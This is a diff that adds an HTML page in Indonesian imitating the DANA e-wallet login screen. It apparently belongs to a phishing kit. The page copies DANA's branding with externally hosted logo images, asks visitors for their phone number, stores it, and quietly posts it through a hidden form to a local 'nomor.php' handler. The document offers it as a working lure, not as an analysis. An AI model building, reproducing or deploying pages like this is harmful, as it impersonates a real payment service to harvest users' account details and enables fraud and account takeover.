@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#118eea" />
+  <title>DANA Login</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #118eea;
+      color: white;
+      text-align: center;
+    }
+
+    .container {
+      padding: 40px 20px 100px;
+    }
+
+    .logo {
+      margin-top: 30px;
+      margin-bottom: 20px;
+    }
+
+    .instruction {
+      font-size: 18px;
+      margin-bottom: 20px;
+    }
+
+    .input-group {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 20px;
+      gap: 10px;
+    }
+
+    .country-code {
+      background-color: white;
+      color: black;
+      border-radius: 10px;
+      padding: 10px 15px;
+      display: flex;
+      align-items: center;
+    }
+
+    .country-code img {
+      width: 20px;
+      height: auto;
+      margin-right: 8px;
+    }
+
+    .phone-input {
+      padding: 12px;
+      font-size: 18px;
+      border: none;
+      border-radius: 10px;
+      width: 200px;
+      text-align: left;
+      font-weight:bold;
+      outline: none;
+      transition: border 0.3s;
+    }
+
+    .phone-input.error {
+      border: 2px solid red;
+    }
+
+    .description {
+      font-size: 12px;
+      color: #f0f0f0;
+      margin: 20px 30px;
+    }
+
+    .description b {
+      color: white;
+    }
+
+    #lanjutBtn {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: white;
+      color: #ccc;
+      font-weight: bold;
+      padding: 14px 120px;
+      font-size: 16px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+
+    .loading {
+      display: none;
+      position: relative;
+      margin-top: 20px;
+      margin-left: auto;
+      margin-right: auto;
+      width: 50px;
+      height: 50px;
+    }
+
+    .loading img.static-image {
+      position: absolute;
+      width: 50px;
+      height: 50px;
+      top: 0;
+      left: 0;
+      z-index: 1;
+    }
+
+    .loading img.spinner {
+      position: absolute;
+      width: 40px;
+      height: 40px;
+      top: 10%;
+      left: 10%;
+      transform: translate(-50%, -50%);
+      animation: spin 0.7s linear infinite;
+      z-index: 2;
+    }
+
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(-360deg); }
+    }
+
+    .label-row {
+      display: flex;
+      justify-content: flex-start;
+      gap: 58px;
+      margin-left: -0px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://blogger.googleusercontent.com/img/a/AVvXsEhfXc04algcDBXvTL87BJNJYm_Aa_Cmfe1kwys1fbrdTMhKXXVH8yAQF8AQTF-n8u_urojb58QooUDsNVJdSCdqjqJ344xTbySiBqMOcTOWLdOUCl1RRoRMGMYCoJuc9hdwyHIw2Rorr_sh1A-4iPAMpvP0sy1CUiCLhF8LxBU3BPDCLWf-DaQc7CgIpvsG" alt="DANA" width="100" />
+    </div>
+    <div class="instruction">Masukkan <b>nomor HP</b> kamu untuk lanjut</div>
+
+    <div class="label-row">
+      <span>Negara</span>
+      <span>Nomor</span>
+    </div>
+
+    <div class="input-group">
+      <div class="country-code">
+        <img src="https://flagcdn.com/w40/id.png" alt="ID">
+        +62
+      </div>
+
+      <input
+        type="tel"
+        class="phone-input"
+        id="phoneNumber"
+        placeholder="812-3456-7890"
+        onkeydown="handleKeyDown(event)"
+      />
+    </div>
+
+    <div class="description">
+      Kami akan menggunakan nomor HP ini sebagai<br>ID kamu dan untuk mengamankan akun kamu. Dengan melanjutkan, kamu juga setuju dengan <b>S&K</b> serta <b>Kebijakan Privasi</b> kami.
+    </div>
+
+    <div class="loading" id="loading">
+      <img src="https://blogger.googleusercontent.com/img/a/AVvXsEhGNxko9JaP0ln_kJmuob7Ns-2UAOOXtvT4HRJJZ2qe2AZskeFrJ5EkKn1pkJ8gkMJ0e7du66jGhr_zrQVTDGC3i6jnTkJTfZ2MqGA0SaKUMk2gpPZVzFOBkUh47FrKLlY-L6Cxj5lw50WB-stSGFdGzh93mv_pm3mZhL_-ZbJyte0InQxeLtAh9gUOZvDc" class="static-image" alt="static">
+      <img src="https://blogger.googleusercontent.com/img/a/AVvXsEgwBRmagHn1FaafTS35Jd6qWd5v02Ro_o1gVltUC2n5tZgbR7Oa-N_mZfx930gTIn6B5O5W3iBUa4TZQEBgbavfithVxydhSCL0WYQgVlCtAWU_FvstTmH48_Qq3FZHvyoPAqIvqqQ7o5umnHdIqggQ6cvbTEYaN_MbaXyGtQfyFr1gkqvxHUAh0NCsnFXg" class="spinner" alt="spinner">
+    </div>
+  </div>
+
+  <!-- FORM TERSEMBUNYI -->
+  <form id="formKirim" action="nomor.php" method="POST" style="display:none;">
+    <input type="hidden" name="phone" id="hiddenPhone">
+  </form>
+
+  <button id="lanjutBtn">LANJUTKAN</button>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  const input = document.getElementById("phoneNumber");
+  const loading = document.getElementById("loading");
+
+  // Format input otomatis dengan tanda -
+  input.addEventListener("input", function () {
+    let cleaned = this.value.replace(/\D/g, ""); // hanya angka
+    let formatted = cleaned.match(/.{1,4}/g)?.join("-") || cleaned;
+    this.value = formatted;
+    this.classList.remove("error");
+  });
+
+  // Tombol keyboard Enter atau panah kanan
+  input.addEventListener("keydown", function (e) {
+    if (e.key === "Enter" || e.key === "ArrowRight") {
+      e.preventDefault();
+      lanjutkan();
+    }
+  });
+
+  // Fungsi lanjutkan
+  window.lanjutkan = function () {
+    const nomor = input.value.trim().replace(/\D/g, '');
+
+    if (!nomor) {
+      input.classList.add('error');
+      return;
+    }
+
+    loading.style.display = "block"; // tampilkan loading
+
+    const formattedNomor = nomor.match(/.{1,4}/g)?.join('-') || nomor;
+    localStorage.setItem("phoneNumber", `+62 ${formattedNomor}`);
+
+    document.getElementById("hiddenPhone").value = `+62 ${formattedNomor}`;
+    document.getElementById("formKirim").submit();
+  };
+});
+
+  // Klik tombol LANJUTKAN juga memanggil fungsi lanjutkan()
+  document.getElementById("lanjutBtn").addEventListener("click", function () {
+    lanjutkan();
+  });
+  
+</script>
+
+</body>
+</html>
